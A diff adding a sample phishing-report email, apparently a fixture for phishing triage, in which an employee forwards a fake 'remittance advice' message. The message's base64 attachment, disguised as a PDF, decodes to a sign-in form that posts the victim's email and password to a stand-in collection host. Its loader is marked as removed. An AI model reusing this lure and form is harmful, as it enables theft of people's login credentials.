@@ -1,0 +1,69 @@
+Received: from mbx01.example.com (mbx01.example.com [10.20.1.11])
+	by mbx02.example.com (Postfix) with ESMTPS id 7Zz9
+	for <phishing-report@example.com>; Tue, 17 Nov 2026 09:01:46 +0000 (UTC)
+From: Jane Doe <jane.doe@example.com>
+To: phishing-report@example.com
+Subject: FW: Remittance advice #44817 - payment released
+Date: Tue, 17 Nov 2026 09:01:44 +0000
+Message-ID: <report-0001.20261117@example.com>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="rep_b1"
+
+--rep_b1
+Content-Type: text/plain; charset="utf-8"
+
+Hi team, this came in yesterday and the attachment asked me to sign in.
+I did not enter my password. - Jane
+
+--rep_b1
+Content-Type: message/rfc822
+Content-Disposition: attachment; filename="Remittance advice 44817.eml"
+
+Received: from mx02.example.com (mx02.example.com [10.20.0.6])
+	by mbx01.example.com (Postfix) with ESMTPS id 5Ab1c2D3
+	for <jane.doe@example.com>; Mon, 16 Nov 2026 14:03:12 +0000 (UTC)
+Authentication-Results: mx02.example.com;
+	spf=pass smtp.mailfrom=ap@northwind-billing.test;
+	dkim=pass header.d=northwind-billing.test header.s=s1;
+	dmarc=pass (p=NONE dis=NONE) header.from=northwind-billing.test
+Received: from smtp.northwind-billing.test (smtp.northwind-billing.test [198.51.100.23])
+	by mx02.example.com (Postfix) with ESMTPS id 5Ab0c1D2
+	for <jane.doe@example.com>; Mon, 16 Nov 2026 14:03:10 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=northwind-billing.test; s=s1;
+	h=from:to:subject:date:message-id; bh=REDACTED; b=REDACTED
+Return-Path: <ap@northwind-billing.test>
+From: "Accounts Payable" <ap@northwind-billing.test>
+To: Jane Doe <jane.doe@example.com>
+Subject: Remittance advice #44817 - payment released
+Date: Mon, 16 Nov 2026 14:03:05 +0000
+Message-ID: <a1b2c3d4.44817@northwind-billing.test>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="inv_mixed_44817"
+
+--inv_mixed_44817
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: 7bit
+
+<html><body><p>Hello,</p>
+<p>Please find attached the remittance advice for invoice 44817. Payment has been released.</p>
+<p>The document is protected - open it in your browser and sign in with your email account to view it.</p>
+<p>Regards,<br>Accounts Payable</p></body></html>
+
+--inv_mixed_44817
+Content-Type: text/html; name="Remittance_Advice_44817.pdf.html"
+Content-Disposition: attachment; filename="Remittance_Advice_44817.pdf.html"
+Content-Transfer-Encoding: base64
+
+PCFET0NUWVBFIGh0bWw+CjxodG1sPjxoZWFkPjxtZXRhIGNoYXJzZXQ9InV0Zi04Ij48dGl0bGU+
+U2VjdXJlIERvY3VtZW50PC90aXRsZT48L2hlYWQ+Cjxib2R5Pgo8cD5UaGlzIHJlbWl0dGFuY2Ug
+ZG9jdW1lbnQgaXMgcHJvdGVjdGVkLiBTaWduIGluIHdpdGggeW91ciBlbWFpbCBhY2NvdW50IHRv
+IHZpZXcgaXQuPC9wPgo8Zm9ybSBtZXRob2Q9InBvc3QiIGFjdGlvbj0iaHR0cHM6Ly9jb2xsZWN0
+Lmludm9pY2UtcG9ydGFsLnRlc3Qvcngvc3VibWl0LnBocCI+CiAgPGlucHV0IHR5cGU9ImVtYWls
+IiBuYW1lPSJsb2dpbiIgdmFsdWU9ImphbmUuZG9lQGV4YW1wbGUuY29tIj4KICA8aW5wdXQgdHlw
+ZT0icGFzc3dvcmQiIG5hbWU9InBhc3N3ZCI+CiAgPGJ1dHRvbiB0eXBlPSJzdWJtaXQiPlZpZXcg
+ZG9jdW1lbnQ8L2J1dHRvbj4KPC9mb3JtPgo8c2NyaXB0Pi8qIHNhbml0aXplZDogb3JpZ2luYWwg
+b2JmdXNjYXRlZCBsb2FkZXIgcmVtb3ZlZCAqLyB2YXIgcCA9IGF0b2IoImMyRnVhWFJwZW1WayIp
+Ozwvc2NyaXB0Pgo8L2JvZHk+PC9odG1sPgo=
+--inv_mixed_44817--
+
+--rep_b1--
